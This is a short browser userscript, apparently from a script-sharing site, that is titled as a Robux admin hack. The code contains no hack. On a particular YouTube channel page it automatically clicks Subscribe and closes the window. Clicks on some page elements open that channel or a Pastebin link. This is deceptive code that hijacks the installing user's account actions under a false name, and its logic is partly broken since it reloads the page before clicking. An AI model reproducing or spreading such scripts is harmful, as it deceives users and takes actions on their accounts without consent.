// ==UserScript==
// @name         Zomblox's Robux Admin Hack
...
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/415633/Zomblox%27s%20Robux%20Admin%20Hack.user.js
// @updateURL https://update.greasyfork.org/scripts/415633/Zomblox%27s%20Robux%20Admin%20Hack.meta.js
// ==/UserScript==
...
if (window.location.href == 'https://www.youtube.com/channel/UCAg0Q7zkeyCcInsHGeMs1iw') {
    window.onload = function() {
        window.location.reload();
        document.querySelector('paper-button[aria-label^="Subscribe"]').click()
        window.close();
    }
}
$(".font-header-2").click(function() {
    window.open("https://www.youtube.com/channel/UCAg0Q7zkeyCcInsHGeMs1iw")
});

$(".btn-control-md").click(function() {
    window.open("https://pastebin.com/JxQHAUZc")
});